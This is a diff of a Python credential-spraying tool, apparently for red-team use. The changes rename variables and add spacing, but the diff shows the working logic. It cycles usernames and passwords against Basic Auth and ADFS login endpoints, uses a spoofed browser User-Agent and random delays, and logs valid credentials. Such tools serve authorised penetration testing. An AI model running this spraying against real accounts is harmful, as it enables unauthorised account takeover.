@@ -144,9 +144,9 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
                 for username in users:
                     session = requests.Session()
                     session.auth = (username, password)
-                    auth = session.get(target)
+                    response = session.get(target)
                     #  Currently checking only if working or not, need to add more tests in the future
-                    if auth.status_code == 200:
+                    if response.status_code == 200:
                         status = 'Valid creds'
                         output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
@@ -238,13 +238,13 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
                                                         'AuthMethod': 'FormsAuthentication'}).encode('ascii')
                     session = requests.Session()
                     session.auth = (username, password)
-                    auth = session.post(target_url, data=post_data, allow_redirects=False,
-                                        headers={'Content-Type': 'application/x-www-form-urlencoded',
-                                                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
-                                                               'Gecko/20100101 Firefox/65.0',
-                                                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
-                                                           'image/webp,*/*;q=0.8'})
-                    status_code = auth.status_code
+                    response = session.post(target_url, data=post_data, allow_redirects=False,
+                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
+                                                     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
+                                                                   'Gecko/20100101 Firefox/65.0',
+                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
+                                                               'image/webp,*/*;q=0.8'})
+                    status_code = response.status_code
                     #  Currently checking only if working or not, need to add more tests in the future
 
                     if status_code == 302:
@@ -334,14 +334,17 @@ def main():
         LOGGER.info("[*] You chose %s method" % args.method)
         autodiscover_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
                               args.sleep, random, min_sleep, max_sleep, args.verbose)
+
     elif args.method == 'adfs':
         LOGGER.info("[*] You chose %s method" % args.method)
         adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
                       args.sleep, random, min_sleep, max_sleep, args.verbose)
+
     elif args.method == 'basicauth':
         LOGGER.info("[*] You chose %s method" % args.method)
         basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
                            args.sleep, random, min_sleep, max_sleep, args.verbose)
+
     else:
         LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
 
